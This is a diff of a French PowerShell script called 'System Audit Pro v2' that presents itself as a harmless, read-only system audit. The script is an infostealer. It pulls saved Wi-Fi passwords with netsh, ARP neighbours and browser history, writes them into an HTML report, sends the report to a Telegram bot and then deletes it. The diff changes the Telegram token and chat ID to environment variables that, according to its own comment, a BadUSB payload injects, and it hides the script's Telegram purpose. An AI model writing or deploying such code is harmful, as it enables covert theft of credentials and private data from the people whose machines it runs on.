@@ -1,9 +1,15 @@
-# --- System Audit Pro v2 - Telegram Edition ---
-# Audit + Wi-Fi + ARP + Historique navigateur + Envoi Telegram
-# Ne modifie RIEN
+# --- System Audit Pro v2 ---
+# Le token et le chat ID sont lus depuis les variables d'environnement
+# (injectées par le payload BadUSB, jamais stockées sur GitHub)
 
-$token = "TOKEN_ID"
-$chatid = "CHAT_ID"
+$token  = $env:TG_TOKEN
+$chatid = $env:TG_CHATID
+
+if (-not $token -or -not $chatid) {
+    Write-Host "[!] TG_TOKEN ou TG_CHATID manquant" -ForegroundColor Red
+    exit 1
+}
+
 $reportPath = "$env:TEMP\audit_report.html"
 $user = $env:USERNAME
 $pc = $env:COMPUTERNAME
@@ -51,7 +57,7 @@ $defender = Get-MpComputerStatus -ErrorAction SilentlyContinue
 $firewall = Get-NetFirewallProfile -ErrorAction SilentlyContinue |
     Select-Object Name, Enabled
 
-# === WIFI PASSWORDS (nécessite admin pour key=clear) ===
+# === WIFI ===
 $wifiList = @()
 $profiles = (netsh wlan show profiles) | Select-String "\:(.+)$" |
     ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
@@ -62,7 +68,7 @@ foreach ($p in $profiles) {
     $wifiList += [PSCustomObject]@{ SSID = $p; Password = $pwd }
 }
 
-# === RESEAU VOISIN (ARP) ===
+# === ARP ===
 $arpRaw = arp -a
 $arpDevices = @()
 foreach ($line in $arpRaw) {
@@ -75,7 +81,7 @@ foreach ($line in $arpRaw) {
     }
 }
 
-# === HISTORIQUE NAVIGATEUR ===
+# === HISTORIQUE ===
 $historyItems = @()
 $browsers = @{
     "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
@@ -86,8 +92,6 @@ foreach ($b in $browsers.GetEnumerator()) {
         try {
             $tmpCopy = "$env:TEMP\hist_$($b.Key).db"
             Copy-Item $b.Value $tmpCopy -Force -ErrorAction Stop
-            $conn = New-Object System.Data.SQLite.SQLiteConnection 2>$null
-            # Sans SQLite, on lit en binaire les URLs
             $content = [System.IO.File]::ReadAllText($tmpCopy, [System.Text.Encoding]::UTF8)
             $urls = [regex]::Matches($content, 'https?://[^\x00-\x1F\s"''<>]{10,120}') |
                 ForEach-Object { $_.Value } | Select-Object -Unique -First 15
@@ -101,8 +105,7 @@ foreach ($b in $browsers.GetEnumerator()) {
 
 # === HTML ===
 $html = @"
-<!DOCTYPE html>
-<html lang="fr"><head><meta charset="UTF-8"><title>Audit - $pc</title>
+<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><title>Audit - $pc</title>
 <style>
 body{font-family:'Segoe UI',Arial,sans-serif;background:#1e1e2e;color:#cdd6f4;margin:0;padding:20px}
 .container{max-width:1200px;margin:0 auto}
@@ -122,7 +125,6 @@ tr:hover{background:#45475a}
 <h1 style="color:#1e1e2e;border:none;margin:0">🔍 Rapport d'Audit Système</h1>
 <p style="margin:5px 0 0 0"><strong>$pc</strong> — Utilisateur : <strong>$user</strong> — $date</p>
 </div>
-
 <h2>💻 Système</h2><div class="info-box">
 <div><span class="label">OS :</span> $(HtmlEncode $os.Caption)</div>
 <div><span class="label">Version :</span> $(HtmlEncode $os.Version)</div>
@@ -130,7 +132,6 @@ tr:hover{background:#45475a}
 <div><span class="label">Dernier démarrage :</span> $($os.LastBootUpTime)</div>
 <div><span class="label">Uptime :</span> $($uptime.Days)j $($uptime.Hours)h $($uptime.Minutes)m</div>
 </div>
-
 <h2>⚙️ Matériel</h2><table>
 <tr><th>Composant</th><th>Détail</th></tr>
 <tr><td>CPU</td><td>$(HtmlEncode $cpu.Name) ($($cpu.NumberOfCores)c/$($cpu.NumberOfLogicalProcessors)t)</td></tr>
@@ -140,7 +141,6 @@ tr:hover{background:#45475a}
 <tr><td>BIOS</td><td>$(HtmlEncode $bios.Manufacturer) $(HtmlEncode $bios.SMBIOSBIOSVersion)</td></tr>
 <tr><td>N° série</td><td>$(HtmlEncode $bios.SerialNumber)</td></tr>
 </table>
-
 <h2>💾 Disques</h2><table>
 <tr><th>Lettre</th><th>Nom</th><th>Total</th><th>Libre</th><th>%</th></tr>
 "@
@@ -216,7 +216,6 @@ foreach ($s in $software) {
     $html += "<tr><td>$(HtmlEncode $s.DisplayName)</td><td>$(HtmlEncode $s.DisplayVersion)</td><td>$(HtmlEncode $s.Publisher)</td></tr>"
 }
 $html += "</table>"
-
 $html += "<div class='footer'>System Audit Pro v2 • $date • Aucune modification effectuée</div></div></body></html>"
 
 $html | Out-File -FilePath $reportPath -Encoding UTF8
@@ -231,5 +230,4 @@ try {
     Write-Host "[!] Erreur d'envoi Telegram : $_" -ForegroundColor Red
 }
 
-# Nettoyage
 Remove-Item $reportPath -Force -ErrorAction SilentlyContinue
